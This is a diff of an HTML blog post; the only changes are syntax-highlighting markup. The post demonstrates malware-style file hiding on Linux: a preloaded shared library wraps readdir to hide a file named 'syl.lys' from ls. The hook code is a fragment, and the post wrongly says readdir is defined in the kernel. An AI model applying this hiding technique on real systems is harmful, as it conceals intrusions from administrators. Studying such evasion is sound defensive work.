@@ -8,17 +8,17 @@ I highly advise you to read through these articles first before we begin with th
 <span><a href=#implementation><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><p>I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I&rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.</p><p>What do we need first and how to hide a file from lets say a command like <code>ls</code>? With a little bit of investigating of how the <code>ls</code> works internally through the <a href=https://github.com/coreutils/coreutils/blob/master/src/ls.c>source code</a> and the <a href=https://man7.org/linux/man-pages/man1/ls.1.html>linux manual page</a>
 We can see that internally we have a function that is called <code>print_dir</code>. I&rsquo;ve truncated the comments of the original source code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>...
 </span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span>
-</span></span><span style=display:flex><span>print_dir (<span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>name, <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>realname, <span style=color:#66d9ef>bool</span> command_line_arg)
+</span></span><span style=display:flex><span><span style=color:#a6e22e>print_dir</span> (<span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>name, <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>realname, <span style=color:#66d9ef>bool</span> command_line_arg)
 </span></span><span style=display:flex><span>...
 </span></span></code></pre></div><p>If we continue further down the function we can see the loop that actually iterates over the files</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>...
 </span></span><span style=display:flex><span> <span style=color:#66d9ef>while</span> (true)
 </span></span><span style=display:flex><span>   {
 </span></span><span style=display:flex><span>     errno <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>     next <span style=color:#f92672>=</span> readdir (dirp); <span style=color:#75715e>// Here we can see that the loop iterates over readdir as long
+</span></span><span style=display:flex><span>     next <span style=color:#f92672>=</span> <span style=color:#a6e22e>readdir</span> (dirp); <span style=color:#75715e>// Here we can see that the loop iterates over readdir as long
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>     <span style=color:#75715e>// as the pointer that readdir returns isn&#39;t null and the errno != 0
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>     <span style=color:#66d9ef>if</span> (next)
 </span></span><span style=display:flex><span>       {
-</span></span><span style=display:flex><span>         <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> file_ignored (next<span style=color:#f92672>-&gt;</span>d_name)) <span style=color:#75715e>// we can see here that it the filename is
+</span></span><span style=display:flex><span>         <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> <span style=color:#a6e22e>file_ignored</span> (next<span style=color:#f92672>-&gt;</span>d_name)) <span style=color:#75715e>// we can see here that it the filename is
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>         <span style=color:#75715e>// taken from the next variable, lets look through the source code of `readdir`
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>           {
 </span></span><span style=display:flex><span>     ...
@@ -28,8 +28,8 @@ We can see that internally we have a function that is called <code>print_dir</co
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> dirent <span style=color:#f92672>*</span><span style=color:#a6e22e>readdir</span>(DIR <span style=color:#f92672>*</span>dirp); <span style=color:#75715e>// Signature of the readdir
 </span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> dirent {
-</span></span><span style=display:flex><span>    ino_t          d_ino;       <span style=color:#75715e>/* Inode number */</span>
-</span></span><span style=display:flex><span>    off_t          d_off;       <span style=color:#75715e>/* Not an offset; see below */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>ino_t</span>          d_ino;       <span style=color:#75715e>/* Inode number */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>off_t</span>          d_off;       <span style=color:#75715e>/* Not an offset; see below */</span>
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> d_reclen;    <span style=color:#75715e>/* Length of this record */</span>
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>  d_type;      <span style=color:#75715e>/* Type of file; not supported
 </span></span></span><span style=display:flex><span><span style=color:#75715e>                                    by all filesystem types */</span>
@@ -47,14 +47,14 @@ We can see that internally we have a function that is called <code>print_dir</co
 </span></span><span style=display:flex><span>    <span style=color:#75715e>// https://man7.org/linux/man-pages/man3/dlsym.3.html
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Search for RTLD_NEXT, basically it allow us to wrap
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// the original function
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    handle <span style=color:#f92672>=</span> dlsym(RTLD_NEXT, <span style=color:#e6db74>&#34;readdir&#34;</span>)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    handle <span style=color:#f92672>=</span> <span style=color:#a6e22e>dlsym</span>(RTLD_NEXT, <span style=color:#e6db74>&#34;readdir&#34;</span>)
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> dirent <span style=color:#f92672>*</span>dp;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>    <span style=color:#75715e>// Iterating over the return values of our original `readdir`
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>while</span>((dp <span style=color:#f92672>=</span> handle(dirp))) {
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>while</span>((dp <span style=color:#f92672>=</span> <span style=color:#a6e22e>handle</span>(dirp))) {
 </span></span><span style=display:flex><span>        <span style=color:#75715e>// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&gt;d_name`)
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// break the loop and go to the next entry, essentially skipping our file.
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(strstr(dp<span style=color:#f92672>-&gt;</span>d_name, <span style=color:#e6db74>&#34;syl.lys&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strstr</span>(dp<span style=color:#f92672>-&gt;</span>d_name, <span style=color:#e6db74>&#34;syl.lys&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
 </span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> dp;
